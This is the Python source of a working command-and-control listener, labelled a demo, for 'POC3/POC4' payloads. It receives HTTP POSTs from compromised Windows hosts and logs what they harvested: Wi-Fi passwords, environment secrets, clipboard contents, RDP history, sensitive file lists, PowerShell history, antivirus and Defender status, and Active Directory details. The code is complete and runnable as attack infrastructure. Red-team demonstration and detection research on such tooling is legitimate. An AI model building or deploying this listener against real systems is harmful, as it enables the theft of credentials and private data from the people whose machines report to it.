#!/usr/bin/env python3
"""
Demo C2 Beacon Listener
Receives deep enumeration data from POC3/POC4 payloads via HTTP POST.
Logs all beacons to console and to beacons.json on disk.

Usage:
    pip install flask
    python c2_server.py

The server listens on 0.0.0.0:5000 by default.
Override with environment variables:
    C2_PORT=8080 python c2_server.py
"""

import json
import os
import sys
from datetime import datetime, timezone

from flask import Flask, request, jsonify

app = Flask(__name__)

BEACONS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "beacons.json")
C2_PORT = int(os.environ.get("C2_PORT", 5000))

# ANSI colors for terminal output
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
C  = "\033[96m"   # cyan
M  = "\033[95m"   # magenta
W  = "\033[97m"   # white
DIM = "\033[2m"
BOLD = "\033[1m"
RST = "\033[0m"

# ------------------------------------------------------------------ #
#  Helpers                                                            #
# ------------------------------------------------------------------ #

def load_beacons():
    if os.path.exists(BEACONS_FILE):
        with open(BEACONS_FILE, "r") as f:
            return json.load(f)
    return []


def save_beacon(entry):
    beacons = load_beacons()
    beacons.append(entry)
    with open(BEACONS_FILE, "w") as f:
        json.dump(beacons, f, indent=2)


def split_pipe(val, limit=0):
    """Split a pipe-delimited string into a list."""
    if not val:
        return []
    items = [x.strip() for x in str(val).split("|") if x.strip()]
    if limit:
        return items[:limit]
    return items


def section(title):
    return f"\n  {BOLD}{C}--- {title} ---{RST}"


def kv(key, val):
    """Format a key-value line."""
    if val is None or val == "" or val == "None":
        return ""
    return f"  {Y}{key:.<28s}{RST} {W}{val}{RST}"


def log_beacon(entry):
    """Pretty-print a full beacon to the terminal."""
    sep = f"{R}{'=' * 76}{RST}"
    raw = entry.get("raw", {})

    beacon_num = len(load_beacons())
    poc = raw.get("poc", entry.get("poc", "?"))

    print(f"\n{sep}")
    print(f"  {BOLD}{R}!! NEW BEACON #{beacon_num} !!{RST}  |  {DIM}{entry.get('received_at', '?')}{RST}")
    print(sep)

    # --- Identity ---
    print(section("IDENTITY"))
    print(kv("POC", poc))
    print(kv("Hostname", raw.get("hostname")))
    print(kv("Username", f"{raw.get('domain', '?')}\\{raw.get('username', '?')}"))
    print(kv("IP Address", raw.get("ip_address")))
    print(kv("MAC Address", raw.get("mac_address")))
    print(kv("OS", raw.get("os_version")))
    print(kv("Source IP", entry.get("source_ip")))

    # --- Security Posture ---
    print(section("SECURITY POSTURE"))
    is_admin = raw.get("is_admin")
    admin_str = f"{R}YES - ELEVATED{RST}" if is_admin else f"{G}No{RST}"
    print(f"  {Y}{'Running as Admin':.<28s}{RST} {admin_str}")
    uac = raw.get("uac_enabled")
    uac_str = f"{G}Enabled{RST}" if uac else f"{R}DISABLED{RST}"
    print(f"  {Y}{'UAC':.<28s}{RST} {uac_str}")
    print(kv("Antivirus", raw.get("antivirus") or f"{R}NONE DETECTED{RST}"))
    print(kv("Firewall", raw.get("firewall")))
    defender = raw.get("defender_disabled")
    if defender:
        print(f"  {Y}{'Defender Realtime':.<28s}{RST} {R}DISABLED{RST}")
    else:
        print(f"  {Y}{'Defender Realtime':.<28s}{RST} {G}Active{RST}")

    # --- Domain ---
    print(section("DOMAIN / ACTIVE DIRECTORY"))
    print(kv("Domain", raw.get("domain_name")))
    roles = {0: "Standalone Workstation", 1: "Member Workstation", 2: "Standalone Server",
             3: "Member Server", 4: "Backup DC", 5: "Primary DC"}
    role_val = raw.get("domain_role")
    print(kv("Domain Role", roles.get(role_val, str(role_val)) if role_val is not None else ""))
    print(kv("Logon Server", raw.get("logon_server")))
    print(kv("Local Admins", raw.get("local_admins")))

    # --- Wi-Fi Passwords ---
    wifi = split_pipe(raw.get("wifi_passwords"))
    if wifi:
        print(section(f"{R}WI-FI PASSWORDS{RST}"))
        for w in wifi:
            print(f"  {R}!!{RST} {W}{w}{RST}")
    else:
        print(section("WI-FI PASSWORDS"))
        print(f"  {DIM}(none recovered){RST}")

    # --- Credentials & Secrets ---
    secrets = split_pipe(raw.get("env_secrets"))
    print(section(f"CREDENTIALS / SECRETS"))
    if secrets:
        for s in secrets:
            print(f"  {R}!!{RST} {W}{s}{RST}")
    else:
        print(f"  {DIM}(no env secrets found){RST}")
    print(kv("RDP History (servers)", raw.get("rdp_history") or "(none)"))
    clip = raw.get("clipboard")
    if clip and str(clip).strip():
        print(f"  {Y}{'Clipboard':.<28s}{RST} {M}{str(clip).strip()[:200]}{RST}")

    # --- Sensitive Files ---
    sens_files = split_pipe(raw.get("sensitive_files"))
    print(section("SENSITIVE FILES (Documents)"))
    if sens_files:
        for sf in sens_files[:20]:
            print(f"    {W}{sf}{RST}")
    else:
        print(f"  {DIM}(none found){RST}")

    dl_files = split_pipe(raw.get("recent_downloads"))
    print(section("RECENT DOWNLOADS"))
    if dl_files:
        for df in dl_files[:10]:
            print(f"    {W}{df}{RST}")
    else:
        print(f"  {DIM}(none found){RST}")

    # --- Network ---
    print(section("NETWORK"))
    print(kv("DNS Servers", raw.get("dns_servers")))
    print(kv("Mapped Drives", raw.get("mapped_drives") or "(none)"))
    shares = raw.get("network_shares")
    if shares and str(shares).strip():
        print(f"  {Y}{'Network Shares':.<28s}{RST}")
        for line in str(shares).split("\n")[:8]:
            print(f"    {DIM}{line.strip()}{RST}")

    conns = split_pipe(raw.get("network"))
    if conns:
        print(f"\n  {Y}Active Connections ({len(conns)} total):{RST}")
        for c in conns[:15]:
            print(f"    {DIM}{c}{RST}")
        if len(conns) > 15:
            print(f"    {DIM}... and {len(conns) - 15} more{RST}")

    # --- Processes ---
    procs = split_pipe(raw.get("processes"))
    if procs:
        print(section(f"RUNNING PROCESSES ({len(procs)} unique)"))
        for p in procs[:25]:
            print(f"    {DIM}{p}{RST}")
        if len(procs) > 25:
            print(f"    {DIM}... and {len(procs) - 25} more{RST}")

    # --- Installed Software ---
    sw = split_pipe(raw.get("installed_software"))
    if sw:
        print(section(f"INSTALLED SOFTWARE ({len(sw)} shown)"))
        for s in sw[:30]:
            print(f"    {DIM}{s}{RST}")

    # --- Startup Programs ---
    startups = split_pipe(raw.get("startup_programs"))
    if startups:
        print(section("STARTUP PROGRAMS"))
        for s in startups:
            print(f"    {DIM}{s}{RST}")

    # --- PowerShell History ---
    ps_hist = split_pipe(raw.get("ps_history"))
    if ps_hist:
        print(section(f"{R}POWERSHELL HISTORY (last {len(ps_hist)} commands){RST}"))
        for cmd in ps_hist:
            print(f"    {M}{cmd}{RST}")

    print(f"\n{sep}")
    print(f"  {BOLD}{G}Beacon stored to beacons.json{RST}")
    print(f"{sep}\n")
    sys.stdout.flush()


# ------------------------------------------------------------------ #
#  Routes                                                             #
# ------------------------------------------------------------------ #

@app.route("/beacon", methods=["POST"])
def receive_beacon():
    """Main endpoint - payloads POST enumeration JSON here."""
    try:
        data = request.get_json(force=True, silent=True) or {}
    except Exception:
        data = {}

    entry = {
        "received_at": datetime.now(timezone.utc).isoformat(),
        "source_ip": request.remote_addr,
        "poc": data.get("poc", "unknown"),
        "raw": data,
    }

    save_beacon(entry)
    log_beacon(entry)

    return jsonify({"status": "ok", "id": len(load_beacons())}), 200


@app.route("/beacons", methods=["GET"])
def list_beacons():
    """Return all received beacons as JSON."""
    return jsonify(load_beacons()), 200


@app.route("/beacons/latest", methods=["GET"])
def latest_beacon():
    """Return the most recent beacon."""
    beacons = load_beacons()
    if beacons:
        return jsonify(beacons[-1]), 200
    return jsonify({"error": "no beacons yet"}), 404


@app.route("/beacons/clear", methods=["DELETE"])
def clear_beacons():
    """Delete all stored beacons (reset for next demo run)."""
    if os.path.exists(BEACONS_FILE):
        os.remove(BEACONS_FILE)
    print(f"\n  {Y}[*] Beacons cleared.{RST}\n")
    return jsonify({"status": "cleared"}), 200


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "listening", "beacons": len(load_beacons())}), 200


# ------------------------------------------------------------------ #
#  Main                                                               #
# ------------------------------------------------------------------ #

if __name__ == "__main__":
    banner = f"""
    {R}============================================{RST}
    {BOLD}{W}  Demo C2 Beacon Listener{RST}
    {BOLD}{W}  Listening on 0.0.0.0:{C2_PORT}{RST}
    {R}============================================{RST}
      POST   /beacon         - receive enum data
      GET    /beacons         - list all beacons
      GET    /beacons/latest  - last beacon
      DELETE /beacons/clear   - reset stored data
      GET    /health          - server status
    {R}============================================{RST}
    {Y}Waiting for beacons...{RST}
    """
    print(banner)
    app.run(host="0.0.0.0", port=C2_PORT, debug=False)
